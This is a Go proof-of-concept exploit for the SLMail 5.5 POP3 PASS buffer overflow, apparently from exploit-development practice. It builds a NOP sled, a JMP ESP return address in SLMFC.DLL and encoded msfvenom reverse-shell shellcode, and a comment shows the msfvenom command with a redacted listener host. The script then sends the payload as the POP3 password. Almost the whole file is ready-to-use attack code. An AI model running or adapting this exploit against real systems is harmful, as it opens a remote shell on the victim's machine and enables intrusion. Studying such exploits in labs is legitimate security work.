// SLMail 5.5 POP3 PASS Buffer Overflow
// By disastrpc @ github.com/disastrpc
// Usage:
// go run poc.go <target>:<pop3 port>

package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

// Crash at 2600 bytes EIP overwrite at 3000
// EIP overwrite at 2606
// badchars \x00\x0a\x0D
func main() {
	target := os.Args[1]
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	fmt.Printf("[*] Connecting to host %v\n", target)
	if err != nil {
		fmt.Printf("[*] Error connecting to host\n")
		os.Exit(1)
	}

	fmt.Printf("[*] Connected\n")

	buf := strings.Repeat("\x90", 2606)
	buf += "\xa3\x63\x4b\x5f" // JMP ESP at 5f4b63a3 SLMFC.DLL
	// msfvenom -p windows/shell_reverse_tcp LHOST=******** LPORT=4242 -e x86/shikata_ga_nai -f c -b "\x00\x0a\x0d" -n 30 --smallest
	// final size 381 bytes
	buf += "\x41\xfc\x90\x41\x99\x98\x99\xf9\x2f\x2f\xf5\x27\x99\x4a\xfc"
	buf += "\x37\x3f\x27\xf5\xf9\x42\x93\x41\xf9\x98\x4b\xf5\x4b\x9f\x90"
	buf += "\xb8\xae\xa0\x8e\xaf\xdb\xc6\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
	buf += "\x52\x31\x42\x12\x83\xc2\x04\x03\xec\xae\x6c\x5a\x0c\x46\xf2"
	buf += "\xa5\xec\x97\x93\x2c\x09\xa6\x93\x4b\x5a\x99\x23\x1f\x0e\x16"
	buf += "\xcf\x4d\xba\xad\xbd\x59\xcd\x06\x0b\xbc\xe0\x97\x20\xfc\x63"
	buf += "\x14\x3b\xd1\x43\x25\xf4\x24\x82\x62\xe9\xc5\xd6\x3b\x65\x7b"
	buf += "\xc6\x48\x33\x40\x6d\x02\xd5\xc0\x92\xd3\xd4\xe1\x05\x6f\x8f"
	buf += "\x21\xa4\xbc\xbb\x6b\xbe\xa1\x86\x22\x35\x11\x7c\xb5\x9f\x6b"
	buf += "\x7d\x1a\xde\x43\x8c\x62\x27\x63\x6f\x11\x51\x97\x12\x22\xa6"
	buf += "\xe5\xc8\xa7\x3c\x4d\x9a\x10\x98\x6f\x4f\xc6\x6b\x63\x24\x8c"
	buf += "\x33\x60\xbb\x41\x48\x9c\x30\x64\x9e\x14\x02\x43\x3a\x7c\xd0"
	buf += "\xea\x1b\xd8\xb7\x13\x7b\x83\x68\xb6\xf0\x2e\x7c\xcb\x5b\x27"
	buf += "\xb1\xe6\x63\xb7\xdd\x71\x10\x85\x42\x2a\xbe\xa5\x0b\xf4\x39"
	buf += "\xc9\x21\x40\xd5\x34\xca\xb1\xfc\xf2\x9e\xe1\x96\xd3\x9e\x69"
	buf += "\x66\xdb\x4a\x3d\x36\x73\x25\xfe\xe6\x33\x95\x96\xec\xbb\xca"
	buf += "\x87\x0f\x16\x63\x2d\xea\xf1\x86\xb3\xcb\x2b\xff\xb1\x33\x3c"
	buf += "\x6d\x3c\xd5\x56\x81\x69\x4e\xcf\x38\x30\x04\x6e\xc4\xee\x61"
	buf += "\xb0\x4e\x1d\x96\x7f\xa7\x68\x84\xe8\x47\x27\xf6\xbf\x58\x9d"
	buf += "\x9e\x5c\xca\x7a\x5e\x2a\xf7\xd4\x09\x7b\xc9\x2c\xdf\x91\x70"
	buf += "\x87\xfd\x6b\xe4\xe0\x45\xb0\xd5\xef\x44\x35\x61\xd4\x56\x83"
	buf += "\x6a\x50\x02\x5b\x3d\x0e\xfc\x1d\x97\xe0\x56\xf4\x44\xab\x3e"
	buf += "\x81\xa6\x6c\x38\x8e\xe2\x1a\xa4\x3f\x5b\x5b\xdb\xf0\x0b\x6b"
	buf += "\xa4\xec\xab\x94\x7f\xb5\xdc\xde\xdd\x9c\x74\x87\xb4\x9c\x18"
	buf += "\x38\x63\xe2\x24\xbb\x81\x9b\xd2\xa3\xe0\x9e\x9f\x63\x19\xd3"
	buf += "\xb0\x01\x1d\x40\xb0\x03"
	buf += strings.Repeat("C", 9)

	reader := bufio.NewReader(conn)
	reader.ReadBytes('\n')

	payload := fmt.Sprintf("PASS %v\r\n", buf)
	conn.Write([]byte("USER Anonymous\r\n"))
	reader.ReadBytes('\n')

	fmt.Println("[*] Sending payload...")
	conn.Write([]byte(payload))
	reader.ReadBytes('\n')
	conn.Close()
}
